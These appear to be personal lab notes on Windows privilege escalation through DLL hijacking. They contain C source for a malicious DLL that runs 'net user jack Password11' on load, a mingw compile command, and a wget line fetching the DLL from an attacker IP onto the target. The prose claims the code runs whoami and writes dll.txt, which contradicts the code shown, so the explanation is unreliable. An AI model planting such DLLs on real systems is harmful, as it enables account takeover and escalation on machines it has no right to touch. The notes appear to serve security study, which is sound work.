Windows uses many DLL files, as you can see simply by visiting the `C:\Windows\System32`folder in any Windows.

#enumerate/windows/DLLHijacking

The tool you can use to find potential DLL hijacking vulnerabilities is `Process Monitor` (ProcMon).


#/windows/creating/maliciousDLL 

```shell-session
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user jack Password11");
        ExitProcess(0);
    }
    return TRUE;
}`

```

Leaving aside the boilerplate parts, you can see this file will execute the `whoami` command (`cmd.exe /k whoami`) and save the output in a file called "dll.txt".

  The mingw compiler can be used to generate the DLL file with the command given below:
`x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`

  
  You can easily install the Mingw compiler using the `apt install gcc-mingw-w64-x86-64` command.
  
  You can copy the C code above given for the DLL file to the AttackBox or the operating system you are using and proceed with compiling.

  Once compiled, we will need to move the hijackme.dll file to the Temp folder in our target system. You can use the following PowerShell command to download the .dll file to the target system: `wget -O hijackme.dll 10.9.9.67:8000/hijackme.dll`
  [[Windows Privesc]]